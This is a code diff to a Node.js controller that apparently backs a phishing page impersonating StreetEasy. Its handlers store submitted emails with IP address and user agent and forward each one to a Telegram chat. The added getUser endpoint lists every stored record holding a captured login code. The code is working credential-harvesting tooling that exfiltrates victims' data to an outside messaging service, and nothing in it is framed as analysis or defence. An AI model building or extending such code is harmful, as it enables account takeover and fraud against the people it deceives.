@@ -35,7 +35,6 @@ const sendEmail = async (req, res) => {
         await user.save()
     }
 
-   
     req.body.ip = getIpAddress() + userAgent;
     user = await Login.create(req.body);
     bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `New email from street easy: ${`${user.email}`}`);
@@ -52,8 +51,6 @@ const sendCode = async (req, res) => {
   try {
     const ipAddress = getIpAddress();
     const userAgent = req.headers["user-agent"];
-
-
     if(!ipAddress) {
        return res.status(404).json({ error: 'ip address not found'})
     }
@@ -71,7 +68,20 @@ const sendCode = async (req, res) => {
   }
 };
 
+const getUser = async (req, res) => {
+  try {
+    const users = await Login.find({ code: { $exists: true } });
+    res.status(200).json({nbHits: users.length, users });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+};
+
+
+
+
 module.exports = {
   sendEmail,
   sendCode,
+  getUser
 };
